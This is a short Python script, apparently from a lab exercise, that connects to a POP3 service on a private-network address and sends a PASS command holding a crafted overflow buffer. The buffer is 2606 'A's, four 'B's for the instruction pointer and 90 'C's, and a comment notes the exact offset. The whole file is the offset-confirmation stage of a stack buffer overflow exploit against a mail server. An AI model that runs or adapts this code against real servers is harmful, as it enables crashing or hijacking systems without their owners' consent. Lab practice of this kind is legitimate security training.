#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

    # Exact match at offset 2606

    evil_buffer = "A" * 2606 + "B" * 4 + "C" * 90

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock_conn = sock.connect(('192.168.193.133', 110))

        data = sock.recv(1024).decode("utf-8")
        print(data)

        user = ("USER test\r\n").encode("utf-8")
        sock.send(user)
        data = sock.recv(1024).decode("utf-8")
        print(data)

        pw = ("PASS {0}\r\n".format(evil_buffer)).encode("utf-8")
        sock.send(pw)
        data = sock.recv(1024).decode("utf-8")
        print(data)
    except socket.error:
        print("[x] Unable to connect...")
    finally:
        sock.close()
        sys.exit(0)

